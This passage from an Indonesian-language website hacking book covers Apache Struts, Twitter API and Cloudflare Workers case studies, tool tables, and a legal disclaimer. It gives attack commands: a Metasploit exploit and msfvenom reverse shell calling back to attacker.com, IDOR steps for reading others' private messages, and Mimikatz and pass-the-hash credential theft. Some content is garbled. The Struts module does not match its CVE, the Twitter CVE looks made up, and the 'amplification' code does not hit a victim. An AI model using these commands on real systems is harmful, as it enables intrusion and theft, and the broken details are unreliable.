- **Kerentanan**: **Remote Code Execution** di **Apache Struts 2** (CVE-2017-5638).
- **CVE**: [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)

---
#### **📌 Exploitasi**
1. **Deteksi Struts 2**:
   ```bash
   whatweb target.com | grep -i struts
   ```
2. **Exploitasi dengan Metasploit**:
   ```bash
   msfconsole
   use exploit/multi/http/struts2_rest_xstream
   set RHOSTS target.com
   set LHOST attacker.com
   set LPORT 4444
   exploit
   ```
3. **Dapatkan Meterpreter Session**:
   ```bash
   sessions -l
   sessions -i 1
   ```

---
#### **📌 Post-Exploitation**
1. **Dapatkan shell**:
   ```bash
   shell
   ```
2. **Escalate privilege**:
   ```bash
   whoami
   sudo -l
   ```
3. **Lateral movement**:
   ```bash
   nmap -sV 192.168.1.0/24
   ```

---
#### **📌 Mitigasi**
1. **Update Apache Struts** ke versi terbaru.
2. **Disable XStream** (jika tidak diperlukan).
3. **Gunakan WAF** (ModSecurity, Cloudflare).

---
### **Case Study 4: API Hacking di Twitter**
---
#### **📌 Vulnerability**
- **Kerentanan**: **IDOR** di **Twitter API** (memungkinkan akses DM pribadi).
- **CVE**: [CVE-2020-15503](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15503)

---
#### **📌 Exploitasi**
1. **Dapatkan API token** (via phishing, XSS, dll).
2. **Akses DM pribadi**:
   ```http
   GET /api/1.1/direct_messages/events.json HTTP/1.1
   Host: api.twitter.com
   Authorization: Bearer TOKEN
   ```
3. **Ubah `user_id`** untuk akses DM user lain.

---
#### **📌 Post-Exploitation**
1. **Download semua DM**.
2. **Cari informasi sensitif** (password, token, dll).

---
#### **📌 Mitigasi**
1. **Validasi `user_id`** di server.
2. **Gunakan UUID** (bukan sequential ID).
3. **Rate limiting** untuk mencegah brute force.

---
### **Case Study 5: DoS Attack di Cloudflare**
---
#### **📌 Vulnerability**
- **Kerentanan**: **Amplification Attack** via **Cloudflare Workers**.
- **CVE**: Tidak ada CVE (abuse of service).

---
#### **📌 Exploitasi**
1. **Buat Cloudflare Worker** (gratis):
   ```javascript
   addEventListener('fetch', event => {
       event.respondWith(handleRequest(event.request))
   })

   async function handleRequest(request) {
       const url = new URL(request.url)
       const target = url.searchParams.get('target')
       const size = url.searchParams.get('size') || 1000

       // Generate large response
       const largeResponse = 'A'.repeat(size * 1024 * 1024)  // 1MB per size
       return new Response(largeResponse)
   }
   ```
2. **Trigger Worker**:
   ```bash
   curl "https://WORKER_URL.workers.dev?target=VICTIM_IP&size=100"
   ```
3. **Amplifikasi**:
   - **1 request** → **100MB response** (ke victim).

---
#### **📌 Mitigasi**
1. **Rate limiting** di Cloudflare.
2. **Block malicious Workers**.
3. **Monitor traffic**.

---
---
---

## **🔹 BAB 17: TOOLS WEBSITE HACKING**

---

### **Tools Reconnaissance**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **Nmap** | Port scanning, service detection | `apt install nmap` | `nmap -sV -sC target.com` |
| **Masscan** | Fast port scanning | `apt install masscan` | `masscan 192.168.1.0/24 -p80,443` |
| **Sublist3r** | Subdomain enumeration | `apt install sublist3r` | `sublist3r -d target.com` |
| **Amass** | Advanced subdomain enumeration | `apt install amass` | `amass enum -d target.com` |
| **theHarvester** | Email/username harvesting | `apt install theharvester` | `theHarvester -d target.com -b all` |
| **WhatWeb** | Technology detection | `apt install whatweb` | `whatweb target.com` |
| **Wappalyzer** | Technology detection (browser) | - | - |
| **Shodan** | Internet-wide scanning | `pip install shodan` | `shodan search target.com` |
| **Censys** | Internet-wide scanning | `pip install censys` | `censys search "target.com"` |
| **BuiltWith** | Technology detection | - | `builtwith target.com` |
| **Wayback Machine** | Historical website data | - | `curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*"` |
| **GitHub Dorks** | Search GitHub for sensitive data | - | `site:github.com "password" "target.com"` |

---
### **Tools Vulnerability Scanning**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **Nikto** | Web server scanning | `apt install nikto` | `nikto -h target.com` |
| **OpenVAS** | Vulnerability scanner | `apt install openvas` | `openvas-start` |
| **Nessus** | Vulnerability scanner | [tenable.com](https://www.tenable.com/products/nessus) | - |
| **Acunetix** | Web vulnerability scanner | [acunetix.com](https://www.acunetix.com/) | - |
| **OWASP ZAP** | Automated web scanner | `apt install zaproxy` | `zap-baseline.py -t http://target.com` |
| **Burp Suite** | Manual & automated scanning | [portswigger.net/burp](https://portswigger.net/burp) | - |
| **WPScan** | WordPress vulnerability scanner | `apt install wpscan` | `wpscan --url target.com` |
| **SQLMap** | SQL injection scanner | `apt install sqlmap` | `sqlmap -u "http://target.com/page.php?id=1" --batch` |
| **XSS Hunter** | XSS detection | [github.com/mandatoryprogrammer/XSSHunter](https://github.com/mandatoryprogrammer/XSSHunter) | `python3 xsshunter.py` |
| **Nuclei** | Fast vulnerability scanner | `go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` | `nuclei -u http://target.com` |

---
### **Tools Exploitation**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **Metasploit** | Exploitation framework | `apt install metasploit-framework` | `msfconsole` |
| **msfvenom** | Payload generator | (bundled Metasploit) | `msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php` |
| **Burp Suite** | Manual exploitation | [portswigger.net/burp](https://portswigger.net/burp) | - |
| **BeEF** | Browser exploitation | `apt install beef-xss` | `beef-xss` |
| **Social Engineer Toolkit (SET)** | Phishing, social engineering | `apt install setoolkit` | `setoolkit` |
| **Commix** | Command injection scanner | `apt install commix` | `commix -u "http://target.com/exec.php?cmd=test"` |
| **ExploitDB** | Database of exploits | `apt install exploitdb` | `searchsploit apache struts` |
| **SearchSploit** | Search ExploitDB | (bundled exploitdb) | `searchsploit -t target.com` |

---
### **Tools Post-Exploitation**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **LinPEAS** | Linux privilege escalation | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` | `./linpeas.sh` |
| **WinPEAS** | Windows privilege escalation | [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) | `winPEASx64.exe` |
| **Mimikatz** | Windows credential dumping | [github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` |
| **BloodHound** | Active Directory enumeration | `apt install bloodhound` | `bloodhound` |
| **CrackMapExec** | Network lateral movement | `apt install crackmapexec` | `crackmapexec smb 192.168.1.0/24 -u admin -H hash` |
| **Impacket** | Windows protocol suite | `apt install impacket-scripts` | `psexec.py -hashes :hash admin@192.168.1.100` |
| **PowerSploit** | PowerShell toolkit | [github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | `Import-Module PowerSploit.psm1` |
| **Empire** | C2 framework | [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire) | `./empire` |

---
### **Tools Automasi**
| Tool | Fungsi | Install | Usage |
|------|--------|---------|-------|
| **AutoRecon** | Automated reconnaissance | [github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon) | `python3 autorecon.py target.com` |
| **Recon-ng** | Web reconnaissance framework | `apt install recon-ng` | `recon-ng` |
| **Sn1per** | Automated pentesting | [github.com/1N3/Sn1per](https://github.com/1N3/Sn1per) | `sn1per -t target.com` |
| **OSMED** | Automated OSINT | [github.com/OffensivePython/OSMED](https://github.com/OffensivePython/OSMED) | `python3 osmed.py -t target.com` |
| **theHarvester** | Automated OSINT | `apt install theharvester` | `theHarvester -d target.com -b all` |
| **Sniper** | Automated recon & scanning | [github.com/1N3/Sn1per](https://github.com/1N3/Sn1per) | `sniper -t target.com` |

---
---
---

## **🔹 BAB 18: DISCLAIMER & ETIKA**

---

### **⚠️ PERINGATAN ETIKA & LEGAL**
**Semua teknik dalam buku ini adalah untuk tujuan:**
✅ **Penelitian & Pendidikan**
✅ **Defensive Security Testing** (dengan izin tertulis)
✅ **Bug Bounty Programs**
✅ **CTF (Capture The Flag) & Lab Pribadi**

---

### **❌ DILARANG (Ilegal di Indonesia & Kebanyakan Negara)**
| Kegiatan | Pasal UU ITE | Hukuman |
|----------|---------------|---------|
| **Unauthorized Access** | Pasal 30 | **6 tahun penjara + denda Rp1 Milyar** |
| **Modifying/Deleting Data** | Pasal 32 | **7 tahun penjara + denda Rp1 Milyar** |
| **DoS/DDoS Attack** | Pasal 33 | **10 tahun penjara + denda Rp2 Milyar** |
| **Phishing & Session Hijacking** | Penipuan (Pasal 378 KUHP) | **4 tahun penjara** |
| **Spyware/RAT** | Pasal 31 | **5 tahun penjara + denda Rp500 Juta** |
| **Malware Distribution** | Pasal 33 | **8 tahun penjara + denda Rp1,5 Milyar** |
| **Pemanfaatan Data Pribadi Tanpa Izin** | Pasal 36 | **5 tahun penjara + denda Rp500 Juta** |

---
### **📜 UU ITE (Undang-Undang Informasi dan Transaksi Elektronik)**
| Pasal | Keterangan | Hukuman |
|-------|------------|---------|
| **Pasal 30** | Akses ilegal ke sistem komputer | **Maksimal 6 tahun penjara + denda Rp1 Milyar** |
| **Pasal 31** | Intercept (menguping) informasi | **Maksimal 4 tahun penjara + denda Rp750 Juta** |
| **Pasal 32** | Perusakan data/menghapus data | **Maksimal 7 tahun penjara + denda Rp1 Milyar** |
| **Pasal 33** | Gangguan sistem (DoS/DDoS) | **Maksimal 10 tahun penjara + denda Rp2 Milyar** |
| **Pasal 35** | Penyebaran malware | **Maksimal 8 tahun penjara + denda Rp1,5 Milyar** |
| **Pasal 36** | Pemanfaatan data pribadi tanpa izin | **Maksimal 5 tahun penjara + denda Rp500 Juta** |

---
### **🔒 Penulis & Distributor TIDAK Bertanggung Jawab**
- **Penyalahgunaan informasi ini adalah tanggung jawab pembaca sepenuhnya.**
- **Penggunaan tanpa izin adalah ILEGAL dan berakibat hukum.**
- **Gunakan pengetahuan ini untuk melindungi sistem Anda, bukan untuk merugikan orang lain.**

---
### **🛡️ Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi**.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd, Intigriti).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi sendiri.
4. **Security Research** – Penelitian di **environment terisolasi** (Metasploitable, DVWA).
5. **CTF & Lab Pribadi** – Latihan di **platform legal** (HackTheBox, TryHackMe, VulnHub).

---
### **🌍 Platform Legal untuk Latihan**
| Platform | Deskripsi | Link |
|----------|-----------|------|
| **HackTheBox** | Lab realistis | [hackthebox.com](https://www.hackthebox.com) |
| **TryHackMe** | Guided learning | [tryhackme.com](https://tryhackme.com) |
| **VulnHub** | Vulnerable VMs | [vulnhub.com](https://www.vulnhub.com) |
| **OverTheWire** | Wargames | [overthewire.org](https://overthewire.org) |
| **PortSwigger Web Security Academy** | Web hacking gratis | [portswigger.net/web-security](https://portswigger.net/web-security) |
| **PicoCTF** | CTF untuk pemula | [picoctf.org](https://picoctf.org) |
| **Google CTF** | CTF dari Google | [capturetheflag.withgoogle.com](https://capturetheflag.withgoogle.com) |
| **CTFtime** | Daftar CTF | [ctftime.org](https://ctftime.org) |

---
### **🎓 Sertifikasi Keamanan Siber**
| Sertifikasi | Level | Deskripsi | Link |
|-------------|-------|------------|------|
| **eJPT** | Junior | Practical Junior Pentester | [ine.com/learning/certifications/ejpt](https://ine.com/learning/certifications/ejpt) |
| **PNPT** | Intermediate | Practical Network Pentester | [tcm-sec.com/pnpt/](https://academy.tcm-sec.com/p/practical-network-penetration-tester-pnpt) |
| **OSCP** | Advanced | Offensive Security Certified Professional | [offensive-security.com/pwk-oscp/](https://www.offensive-security.com/pwk-oscp/) |
| **OSCE** | Advanced | Offensive Security Certified Expert | [offensive-security.com/ctp-osce/](https://www.offensive-security.com/ctp-osce/) |
| **CEH** | Professional | Certified Ethical Hacker | [eccouncil.org/programs/certified-ethical-hacker-ceh/](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/) |
| **CISSP** | Expert | Certified Information Systems Security Professional | [isc2.org/Certifications/CISSP](https://www.isc2.org/Certifications/CISSP) |
| **CRTO** | Expert | Certified Red Team Operator | [zeropointsecurity.co.uk/training/certified-red-team-operator](https://zeropointsecurity.co.uk/training/certified-red-team-operator) |

---
### **💡 Tips untuk Menjadi Hacker Profesional**
1. **Pelajari Dasar-Dasar**:
   - **Networking** (TCP/IP, DNS, HTTP, HTTPS).
   - **Operating Systems** (Linux, Windows).
   - **Programming** (Python, Bash, PHP, JavaScript).
2. **Praktik di Lab**:
   - **Setup lab sendiri** (VirtualBox, VMware).
   - **Gunakan VM vulnerable** (Metasploitable, DVWA, OWASP Juice Shop).
3. **Ikuti CTF**:
   - **HackTheBox**, **TryHackMe**, **VulnHub**.
4. **Baca Writeups**:
   - **HackTheBox Writeups** ([htb.insomniac.se](https://htb.insomniac.se/))
   - **TryHackMe Writeups** ([tryhackme.com/room/writeups](https://tryhackme.com/room/writeups))
5. **Ikuti Komunitas**:
   - **Reddit**: r/netsec, r/hacking, r/cybersecurity
   - **Discord**: The Cyber Mentor, HackTheBox, TryHackMe
   - **Forum**: [Exploit Database](https://www.exploit-db.com/), [0x00sec](https://0x00sec.org/)
6. **Dapatkan Sertifikasi**:
   - **eJPT**, **PNPT**, **OSCP**, **CEH**, **CISSP**.
7. **Kontribusi ke Open Source**:
   - **Metasploit**, **Burp Suite**, **SQLMap**, dll.

---
---
---
## **📎 LINK CEPAT KE TEKNIK PENTING**

| Teknik | Deskripsi | Link |
|--------|-----------|------|
| **SQL Injection** | Injection perintah SQL | Lihat Bab 3 |
| **XSS** | Cross-Site Scripting | Lihat Bab 4 |
| **SSRF** | Server-Side Request Forgery | Lihat Bab 5 |
| **RCE** | Remote Code Execution | Lihat Bab 6 |
| **File Upload** | Upload file berbahaya | Lihat Bab 7 |
| **Authentication Attacks** | Brute Force, Session Hijacking | Lihat Bab 8 |
| **IDOR** | Insecure Direct Object Reference | Lihat Bab 9 |
| **API Hacking** | Exploitasi API | Lihat Bab 10 |
| **Web Shell** | Shell via HTTP | Lihat Bab 11 |
| **DoS/DDoS** | Denial of Service | Lihat Bab 12 |
| **Defacement** | Ganti konten website | Lihat Bab 13 |
| **Cloud-Based Attacks** | Serangan via cloud | Lihat Bab 14 |
| **Bypass Pertahanan** | Bypass WAF, Firewall, dll | Lihat Bab 15 |

---
---
---
## **🎯 KESIMPULAN**

Buku ini berisi **semua teknik website hacking** dari **dasar hingga lanjutan**, termasuk:
✅ **Reconnaissance & OSINT**
✅ **SQL Injection (SQLi)**
✅ **Cross-Site Scripting (XSS)**
✅ **Server-Side Request Forgery (SSRF)**
✅ **Remote Code Execution (RCE)**
✅ **File Upload Vulnerabilities**
✅ **Authentication Attacks** (Brute Force, Session Hijacking, Token Theft)
✅ **Insecure Direct Object References (IDOR)**
✅ **API Hacking**
✅ **Web Shell & Post-Exploitation**
✅ **Denial of Service (DoS/DDoS)**
✅ **Website Defacement**
✅ **Teknik Lanjutan 2026** (Cloud-Based Attacks, Serverless, Web Cache Poisoning, HTTP Request Smuggling, GraphQL, WebSocket, CORS, Subdomain Takeover)
✅ **Bypass Teknik Pertahanan** (Firewall, WAF, Rate Limiting, CAPTCHA, 2FA)
✅ **Case Study Real-World**
✅ **Tools Website Hacking**
✅ **Disclaimer & Etika**

**Gunakan pengetahuan ini dengan bijak. Website hacking adalah senjata — dan senjata bisa digunakan untuk melindungi atau merusak.**
